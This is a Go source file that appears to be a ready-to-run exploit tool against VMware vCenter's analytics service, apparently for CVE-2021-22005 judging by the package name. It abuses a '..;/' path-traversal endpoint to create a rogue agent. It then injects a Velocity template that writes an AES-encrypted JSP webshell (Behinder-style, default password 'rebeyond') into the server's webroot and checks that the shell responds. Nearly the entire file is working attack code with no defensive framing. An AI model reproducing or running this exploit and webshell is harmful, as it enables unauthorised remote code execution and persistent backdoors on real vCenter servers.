package c_22005

import (
	"fmt"
	"github.com/imroc/req/v3"
	"io/ioutil"
	"math/rand"
	"os"
	"strings"
	"time"
)

var user_agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36 Edg/80.0.361.54"
var Proxy_server = ""

func id_generator(add_time int64) string {
	var list_str = []string{}
	size := 6
	chars := "abcdefghijklmnopqrstuvwxyz"
	dights := "0123456789"
	strs := chars + dights
	zz := time.Now().Unix() + add_time
	rand.Seed(zz)

	a := int64(len(strs))
	for i := 0; i < size; i++ {
		flag := rand.Int63n(a)
		_ = flag
		list_str = append(list_str, string(strs[int(flag)]))
	}

	// res := strings.Join(s, "")
	res := strings.Join(list_str, "")

	return res

}

func Create_agent(url, log_param, agent_name string) {

	target := fmt.Sprintf("%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=%s&_i=%s", url, agent_name, log_param)
	body := `{"manifestSpec":{}, 
	"objectType": "a2",
	"collectionTriggerDataNeeded": true,
	"deploymentDataNeeded":true, 
	"resultNeeded": true, 
	"signalCollectionCompleted":true, 
	"localManifestPath": "a7",
	"localPayloadPath": "a8",
	"localObfuscationMapPath": "a9"}`
	client := req.C().DisableDumpAll().DisableDebugLog()
	client.EnableInsecureSkipVerify()
	client.EnableForceHTTP1()
	client.SetUserAgent(user_agent)
	client.SetTimeout(2 * time.Second)
	client.SetProxyURL(Proxy_server)
	myheader := map[string]string{"Cache-Control": "max-age=0",
		"Upgrade-Insecure-Requests": "1",
		"User-Agent":                "Mozilla/5.0",
		"X-Deployment-Secret":       "abc",
		"Content-Type":              "application/json",
		"Connection":                "close"}
	resp, err := client.R().SetContentType("application/json").
		SetHeaders(myheader).
		SetBody(body).
		Post(target)
	if err != nil {
		if strings.Contains(err.Error(), "Timeout") {

		} else {
			fmt.Println("[-] Upload failure, please check network.")
			os.Exit(0)
		}

	}
	_ = resp
}

func get_data(str string) string {
	a := strings.Replace(str, "\n", "\\n", -1)
	a = strings.Replace(a, "\t", "        ", -1)
	a = strings.Replace(a, "\"", "\\\"", -1)
	return a

}
func Upload_shell(url, log_param, agent_name, wb_str string) {

	tarGet := fmt.Sprintf("%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=%s&_i=%s", url, agent_name, log_param)

	webshell := ""
	if len(wb_str) > 1 {
		webshell = wb_str
	}
	webshell = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
	webshell_str := str_to_escape(webshell)
	manifest_data := get_data(generate_manifest("/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/vs-s3rver.jsp", webshell_str))
	_ = manifest_data
	myheader := map[string]string{"Cache-Control": "max-age=0",
		"Upgrade-Insecure-Requests": "1",
		"User-Agent":                "Mozilla/5.0",
		"X-Deployment-Secret":       "abc",
		"Content-Type":              "application/json",
		"Connection":                "close"}
	data := fmt.Sprintf("{\"contextData\": \"a3\",\"%s\":\"%s\",\"objectId\": \"a2\"}", "manifestContent", manifest_data)
	// fmt.Println(jsonText)
	client := req.C().DisableDumpAll().DisableDebugLog()
	client.DisableAutoDecode()
	client.SetTimeout(6 * time.Second)
	client.EnableInsecureSkipVerify()
	client.EnableForceHTTP1()
	client.SetUserAgent(user_agent)
	client.SetProxyURL(Proxy_server)
	resp, err := client.R().SetContentType("application/json").
		SetHeaders(myheader).
		SetBody(data).
		Post(tarGet)
	if err != nil {
		if strings.Contains(err.Error(), "Timeout") {

		} else {
			fmt.Println("[-] Upload failure, please check network.")
			os.Exit(0)
		}
	}
	if resp.StatusCode == 201 || resp.StatusCode == 200 {

		fmt.Println("[+] Upload success，check Webshell...")
	} else {
		// fmt.Println(resp.StatusCode)
		fmt.Println("[-] Upload failure.")
		os.Exit(0)
	}

}

func str_to_escape(str string) string {
	// byte_str := []byte(str)
	res := ""
	for _, value := range str {
		// fmt.Print(value)
		// a, err := strconv.Atoi(string(value))
		// _ = err
		s := fmt.Sprintf("\\\\u%04x", string(value))
		// fmt.Println(s)
		res += s
	}

	return res
}

func generate_manifest(webshell_location, webshell string) string {
	ss := `<manifest recommendedPageSize="500">
	<request>
	 <query name="vir:VCenter">
	   <constraint>
		<targetType>ServiceInstance</targetType>
	   </constraint>
	   <propertySpec>
		<propertyNames>content.about.instanceUuid</propertyNames>
		<propertyNames>content.about.osType</propertyNames>
		<propertyNames>content.about.build</propertyNames>
		<propertyNames>content.about.version</propertyNames>
	   </propertySpec>
	 </query>
	</request>
	<cdfMapping>
	 <indepedentResultsMapping>
	   <resultSetMappings>
		<entry>
		  <key>vir:VCenter</key>
		  <value>
					   <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
			 <resourceItemToJsonLdMapping>
			  <forType>ServiceInstance</forType>
			 <mappingCode><![CDATA[  
			  #set($appender = $GLOBAL-logger.logger.parent.getAppender("LOGFILE"))##
			  #set($orig_log = $appender.getFile())##
			  #set($logger = $GLOBAL-logger.logger.parent)##  
			  $appender.setFile("%s")##  
			  $appender.activateOptions()## 
			  $logger.warn("%s")## 
			  $appender.setFile($orig_log)##  
			  $appender.activateOptions()##]]>
			 </mappingCode>
			 </resourceItemToJsonLdMapping>
		   </value>
		  </value>
		</entry>
	   </resultSetMappings>
	 </indepedentResultsMapping>
	</cdfMapping>
	<requestSchedules>
	 <schedule interval="1h">
	   <queries>
		<query>vir:VCenter</query>
	   </queries>
	 </schedule>
	</requestSchedules>
  </manifest>`
	_ = ss
	a := fmt.Sprintf(ss, webshell_location, webshell)
	return a
}

func Check(url string) {
	client := req.C()
	client.SetProxyURL(Proxy_server)
	client.SetTimeout(2 * time.Second)
	shell_url := url + "/idm/..;/" + "vs-s3rver.jsp"
	resp, err := client.R().
		Get(shell_url)
	if err != nil {
		panic(err)
	}
	if strings.Contains(resp.String(), "root") {
		fmt.Println("[+] shell url: " + shell_url)

	} else {
		fmt.Println("[-] Exploit failure 0.0")
	}
}

func Test(url, filename string) {
	log_param := id_generator(int64(2))
	agent_name := id_generator(int64(5))
	Create_agent(url, log_param, agent_name)
	ss, err := ioutil.ReadFile(filename)
	if err != nil {
		fmt.Println("[-] Read file failure.")
		os.Exit(0)
	}
	s := string(ss)
	Upload_shell(url, log_param, agent_name, s)
	Check(url)
}
